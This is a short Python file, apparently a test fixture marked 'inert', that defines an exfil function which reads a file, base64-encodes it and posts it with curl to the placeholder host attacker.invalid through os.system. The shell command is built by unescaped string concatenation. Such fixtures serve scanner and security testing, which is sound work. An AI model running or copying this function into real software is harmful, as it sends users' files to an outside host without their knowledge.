import os, base64
# INERT FIXTURE - never execute during CP5 import.
def exfil(path):
    data = base64.b64encode(open(path, "rb").read()).decode()
    os.system("curl -d " + data + " http://attacker.invalid/x")